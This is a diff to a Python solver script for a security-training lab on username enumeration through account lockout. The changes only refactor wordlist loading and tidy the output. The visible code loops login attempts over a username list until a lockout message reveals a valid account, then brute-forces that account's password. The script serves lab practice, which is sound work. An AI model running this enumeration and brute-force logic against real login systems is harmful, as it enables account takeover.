@@ -1,3 +1,4 @@
+import pkgutil
 import requests
 import urllib3
 import re
@@ -10,11 +11,12 @@ LAB_NAME = "Username enumeration via account lock"
 SCRIPT_START_TIME = time.time()
 
 
-def read_list(files_path):
+def read_list(filename):
     try:
-        return open(files_path, 'rt').read().splitlines()
-    except:
-        print(Fore.RED + "[!] Failed to open the file " + files_path)
+        data = pkgutil.get_data('burplabs', filename)
+        return data.decode().splitlines()
+    except Exception as e:
+        print(f"[!] Failed to read {filename}: {e}")
         exit(1)
 
 
@@ -47,7 +49,8 @@ def try_to_find_valid_username(session, usernames_list, url):
     total_users = len(usernames_list)
 
     for try_number in range(4):
-        print(Fore.WHITE + f"⦗*⦘ Try number: " + Fore.BLUE + str(try_number + 1) + Fore.WHITE + f" of {total_users} usernames..")
+        print(Fore.WHITE + f"⦗*⦘ Try number: " + Fore.BLUE +
+              str(try_number + 1) + Fore.WHITE + f" of {total_users} usernames..")
 
         for counter, user in enumerate(usernames_list):
             print_progress(counter, total_users, user)
@@ -55,7 +58,8 @@ def try_to_find_valid_username(session, usernames_list, url):
 
             if response and response.status_code == 200:
                 if "too many incorrect login attempts" in response.text:
-                    print(Fore.GREEN + f"\n🗹 Valid username identified: {user}")
+                    print(Fore.GREEN +
+                          f"\n🗹 Valid username identified: {user}")
                     return user
 
     print(Fore.RED + "⦗!⦘ No valid username was found")
@@ -81,7 +85,6 @@ def brute_force_password(session, valid_user, passwords, url):
 
     print(Fore.RED + "⦗!⦘ No valid password was found")
     exit(1)
-
 
 
 def run(url, payload, proxies=None):
